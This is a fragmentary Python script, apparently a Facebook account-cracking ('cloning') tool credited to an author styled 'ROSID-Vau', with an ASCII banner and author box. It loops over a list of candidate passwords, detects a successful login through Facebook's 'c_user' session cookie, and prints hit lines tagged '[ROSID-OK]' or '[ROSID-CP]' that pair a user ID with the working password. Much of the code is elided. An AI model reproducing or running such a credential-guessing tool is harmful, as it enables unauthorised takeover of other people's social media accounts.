...
'''
this is an open source program by mr. Error (ROSID-Vau)
...
\__|  \__| \______/ \_______/ \__| \_______|
	...
	print("")
	print("%s╔══════════════════════════════════════════╗"%(Z))
	print("%s║%s  Author   : MD Abdul Rosid                  %s║"%(Z,B,m,Z))
	print("%s║%s  Github   : https://github.com/Rosid456 %s║"%(Z,B,Z))
	print("%s║%s  FACEBOOK : Md Abdul Rosid      %s║"%(Z,B,Z))
	...
	try:
		for pasw in pwx:
			...
			if 'c_user' in fb_cookies:
				...
				uidx = coki[65:80]
				#print('\033[1;32m [ROSID-OK] '+uidx+'|'+pasw+'\033[0;97m')
				...
				coki=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
				uidx = coki[82:97]
				print('\033[1;31m [ROSID-CP] '+uidx+' | '+pasw+'\033[0;97m')
